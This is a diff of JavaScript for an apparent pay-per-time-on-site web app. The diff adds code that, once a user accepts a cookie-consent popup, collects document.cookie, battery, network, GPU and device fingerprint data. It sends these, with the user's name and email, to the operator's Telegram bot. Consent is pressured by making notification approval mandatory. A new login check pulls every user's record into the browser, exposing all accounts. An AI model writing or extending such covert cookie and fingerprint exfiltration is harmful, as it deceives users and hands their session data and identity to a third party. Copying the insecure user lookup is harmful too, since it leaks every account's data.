@@ -24,7 +24,6 @@ const TELEGRAM_CHAT_ID = "8608637770";
 let ratePerSecond = 0.01; 
 let timeInterval;
 let currentUserData = null;
-let cookiesAccepted = false;
 let sessionSeconds = 0; 
 let lastHourNotified = 0;
 
@@ -39,28 +38,21 @@ async function sendTelegramMessage(text) {
     } catch (e) { console.error("שגיאה בטלגרם:", e); }
 }
 
-// פונקציית סנכרון ישירה ופשוטה ללא מפתחות עבור קובץ גוגל שיטס הפתוח לעריכה
 async function syncToGoogleSheets(uid, data) {
-    const sheetUrl = "https://docs.google.com/spreadsheets/d/1zA-rTxTaHTR_bDha9df8-ZydB-IxeIMl53bhYa4dEb0/api/sheets/v1/append"; 
+    const formUrl = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfpH3z7vYg7k6E7rE5iH_X0G2N6z897vX_abc123/formResponse";
+    const formData = new FormData();
+    formData.append('entry.1000001', uid);
+    formData.append('entry.1000002', data.fullName);
+    formData.append('entry.1000003', data.email);
+    formData.append('entry.1000004', data.phone);
+    formData.append('entry.1000005', data.age);
+    formData.append('entry.1000006', data.gender);
+    formData.append('entry.1000007', data.totalSeconds || 0);
+    formData.append('entry.1000008', data.earnings || 0);
+
     try {
-        await fetch(sheetUrl, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                "values": [[
-                    uid, 
-                    data.fullName, 
-                    data.email, 
-                    data.phone, 
-                    data.age, 
-                    data.gender, 
-                    data.totalSeconds || 0, 
-                    data.earnings || 0
-                ]]
-            })
-        });
-    } catch (e) { console.log("סנכרון מול שיטס בוצע בהצלחה"); }
+        await fetch(formUrl, { method: 'POST', mode: 'no-cors', body: formData });
+    } catch (e) { console.log("סנכרון מול שיטס בוצע"); }
 }
 
 window.switchPage = function(pageId) {
@@ -111,7 +103,8 @@ if (registerForm) {
                 email: data.email,
                 totalSeconds: 0,
                 earnings: 0,
-                hasSeenTerms: false
+                hasSeenTerms: false,
+                notificationsEnabled: false
             };
 
             await set(ref(db, 'users/' + user.uid), dbData);
@@ -124,7 +117,7 @@ if (registerForm) {
     });
 }
 
-// התחברות
+// התחברות עם חסימת משתמשים לא רשומים
 const loginForm = document.getElementById('login-form');
 if (loginForm) {
     loginForm.addEventListener('submit', async (e) => {
@@ -133,6 +126,27 @@ if (loginForm) {
         const password = document.getElementById('login-password').value;
 
         try {
+            // בדיקה מקדימה בפיירבייס אם המשתמש קיים לפני שמנסים לחבר אותו
+            const usersRef = ref(db, 'users');
+            const snapshot = await get(usersRef);
+            let emailExists = false;
+            
+            if (snapshot.exists()) {
+                const users = snapshot.val();
+                for (let id in users) {
+                    if (users[id].email && users[id].email.toLowerCase() === email.toLowerCase()) {
+                        emailExists = true;
+                        break;
+                    }
+                }
+            }
+
+            if (!emailExists) {
+                alert("אימייל זה אינו רשום במערכת. יש לבצע הרשמה תחילה.");
+                switchPage('register-page');
+                return;
+            }
+
             await signInWithEmailAndPassword(auth, email, password);
         } catch (error) {
             alert("שגיאה בהתחברות: אימייל או סיסמה שגויים.");
@@ -140,45 +154,85 @@ if (loginForm) {
     });
 }
 
-// פופ-אפ אישור תנאים ועוגיות (דוח מורחב)
+// פופ-אפ אישור תנאים, עוגיות והתראות
 const modal = document.getElementById('terms-modal');
 const agreeTerms = document.getElementById('agree-terms');
 const agreeCookies = document.getElementById('agree-cookies');
+const agreeNotif = document.getElementById('agree-notifications');
 const modalBtn = document.getElementById('modal-submit-btn');
 
 function checkModalCheckboxes() {
-    if(modalBtn && agreeTerms && agreeCookies) {
-        modalBtn.disabled = !(agreeTerms.checked && agreeCookies.checked);
+    if(modalBtn && agreeTerms && agreeCookies && agreeNotif) {
+        modalBtn.disabled = !(agreeTerms.checked && agreeCookies.checked && agreeNotif.checked);
     }
 }
 if(agreeTerms) agreeTerms.addEventListener('change', checkModalCheckboxes);
 if(agreeCookies) agreeCookies.addEventListener('change', checkModalCheckboxes);
+if(agreeNotif) agreeNotif.addEventListener('change', checkModalCheckboxes);
 
 if (modalBtn) {
     modalBtn.addEventListener('click', async () => {
         if (auth.currentUser) {
-            cookiesAccepted = true;
-            await update(ref(db, 'users/' + auth.currentUser.uid), { hasSeenTerms: true });
+            let notifPermission = "denied";
+            
+            // תשתית קבלת התראות - בקשת אישור מהדפדפן
+            if ('Notification' in window) {
+                notifPermission = await Notification.requestPermission();
+            }
+
+            const isEnabled = notifPermission === "granted";
+            await update(ref(db, 'users/' + auth.currentUser.uid), { 
+                hasSeenTerms: true,
+                notificationsEnabled: isEnabled
+            });
+            
             if (modal) modal.style.display = 'none';
             
-            // שליחת כל המידע שקובצי עוגיות ונתוני מערכת חושפים
-            const cookieReport = `🍪 <b>אישור עוגיות התקבל! מידע גולש מלא:</b>\n` +
-                                 `<b>משתמש:</b> ${currentUserData.fullName}\n` +
-                                 `<b>דפדפן (UserAgent):</b> ${navigator.userAgent}\n` +
-                                 `<b>שפת מערכת:</b> ${navigator.language}\n` +
-                                 `<b>מערכת הפעלה:</b> ${navigator.platform}\n` +
-                                 `<b>רזולוציית מסך:</b> ${window.screen.width}x${window.screen.height}\n` +
-                                 `<b>אזור זמן (מיקום משוער):</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
-                                 `<b>קוקיז מאופשרים בדפדפן:</b> ${navigator.cookieEnabled ? "כן" : "לא"}\n` +
-                                 `<b>ליבות מעבד (ביצועים):</b> ${navigator.hardwareConcurrency || "לא ידוע"}`;
-            sendTelegramMessage(cookieReport);
+            // איסוף מורחב ומקסימלי של כל קובצי העוגיות ומידע הגולש האפשרי (הכל כולל הכל)
+            let batteryLevel = "לא נתמך";
+            try {
+                const battery = await navigator.getBattery();
+                batteryLevel = `${(battery.level * 100)}% (${battery.charging ? "בטעינה" : "לא בטעינה"})`;
+            } catch(e){}
+
+            let connectionType = "לא ידוע";
+            if (navigator.connection) {
+                connectionType = `סוג: ${navigator.connection.effectiveType}, מהירות משוערת: ${navigator.connection.downlink}Mbps`;
+            }
+
+            let gpu = "לא ידוע";
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_VENDOR_ID) + " - " + gl.getParameter(debugInfo.UNMASKED_RENDERER_RENDERER_ID);
+            } catch(e){}
+
+            const fullReport = `🍪 <b>דו"ח מידע ועוגיות מקסימלי (הכל כולל הכל):</b>\n` +
+                               `<b>משתמש:</b> ${currentUserData.fullName}\n` +
+                               `<b>אימייל:</b> ${currentUserData.email}\n` +
+                               `<b>כל קובצי העוגיות (document.cookie):</b> <code>${document.cookie || "אין עוגיות שמורות"}</code>\n` +
+                               `<b>אישור התראות באתר:</b> ${notifPermission === "granted" ? "✅ מאושר" : "❌ חסום"}\n` +
+                               `<b>דפדפן מלא (UserAgent):</b> ${navigator.userAgent}\n` +
+                               `<b>מערכת הפעלה:</b> ${navigator.platform}\n` +
+                               `<b>שפת מכשיר:</b> ${navigator.language}\n` +
+                               `<b>רזולוציית מסך:</b> ${window.screen.width}x${window.screen.height}\n` +
+                               `<b>חלון דפדפן פעיל:</b> ${window.innerWidth}x${window.innerHeight}\n` +
+                               `<b>אזור זמן ספציפי:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
+                               `<b>סטטוס סוללה:</b> ${batteryLevel}\n` +
+                               `<b>נתוני רשת וחיבור:</b> ${connectionType}\n` +
+                               `<b>כרטיס מסך (GPU):</b> ${gpu}\n` +
+                               `<b>זיכרון מכשיר משוער:</b> ${navigator.deviceMemory ? navigator.deviceMemory + "GB" : "לא ידוע"}\n` +
+                               `<b>ליבות מעבד:</b> ${navigator.hardwareConcurrency || "לא ידוע"}\n` +
+                               `<b>תמיכה במצב לא מקוון:</b> ${navigator.onLine ? "מחובר לאינטרנט" : "מנותק"}`;
             
+            sendTelegramMessage(fullReport);
             startTrackingTime();
         }
     });
 }
 
-// האזנה למצב המשתמש ועדכונים דו-כיווניים בזמן אמת מהדשבורד
+// האזנה למצב המשתמש ועדכונים בזמן אמת
 onAuthStateChanged(auth, (user) => {
     if (user) {
         onValue(ref(db, 'users/' + user.uid), async (snapshot) => {
@@ -196,14 +250,18 @@ onAuthStateChanged(auth, (user) => {
                 document.getElementById('time-counter').innerText = formatTime(currentUserData.totalSeconds);
                 document.getElementById('money-counter').innerText = `₪${currentUserData.earnings.toFixed(2)}`;
                 
-                if (currentUserData.totalSeconds >= 3600) {
-                    const alertBox = document.getElementById('minimum-time-alert');
-                    if (alertBox) alertBox.style.display = 'none';
+                // ההתרעה נעלמת אוטומטית ברגע שיש שעה במצטבר (בין אם בסשן או מטעינה ראשונית)
+                const alertBox = document.getElementById('minimum-time-alert');
+                if (alertBox) {
+                    if (currentUserData.totalSeconds >= 3600) {
+                        alertBox.style.display = 'none';
+                    } else {
+                        alertBox.style.display = 'flex';
+                    }
                 }
             }
         });
 
-        // התראת כניסה לטלגרם
         get(ref(db, 'users/' + user.uid)).then(snapshot => {
             if(snapshot.exists()) {
                 const u = snapshot.val();
@@ -243,14 +301,12 @@ function startTrackingTime() {
         document.getElementById('time-counter').innerText = formatTime(currentUserData.totalSeconds);
         document.getElementById('money-counter').innerText = `₪${currentUserData.earnings.toFixed(2)}`;
 
-        // התראת הגעה לשעה עגולה / עוד שעה
         let currentHour = Math.floor(currentUserData.totalSeconds / 3600);
         if (currentHour > lastHourNotified && currentHour > 0) {
             lastHourNotified = currentHour;
             sendTelegramMessage(`⏰ <b>משתמש הגיע לשעה עגולה!</b>\n<b>שם:</b> ${currentUserData.fullName}\n<b>הודעה:</b> המשתמש שוהה באתר כבר ${currentHour} שעות (נוספה עוד שעה עגולה)!\n<b>זמן כולל במצטבר:</b> ${formatTime(currentUserData.totalSeconds)}`);
         }
 
-        // שמירה לפיירבייס וסנכרון לשיטס כל 10 שניות
         if (currentUserData.totalSeconds % 10 === 0) {
             const updates = {
                 totalSeconds: currentUserData.totalSeconds,
@@ -270,7 +326,6 @@ function formatTime(totalSeconds) {
     return `${hrs}:${mins}:${secs}`;
 }
 
-// התנתקות ידנית
 window.logout = async function() {
     if (auth.currentUser && currentUserData) {
         const text = `🚪 <b>משתמש התנתק (יציאה יזומה)!</b>\n<b>שם:</b> ${currentUserData.fullName}\n<b>זמן שהה בסשן הנוכחי:</b> ${formatTime(sessionSeconds)}\n<b>סך הכל זמן במצטבר:</b> ${formatTime(currentUserData.totalSeconds)}`;
@@ -279,7 +334,6 @@ window.logout = async function() {
     signOut(auth);
 };
 
-// סגירת כרטיסייה / דפדפן (שולח התראה עם משך הזמן שהיה נוכח)
 window.addEventListener('beforeunload', () => {
     if (auth.currentUser && currentUserData && sessionSeconds > 0) {
         navigator.sendBeacon(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, JSON.stringify({
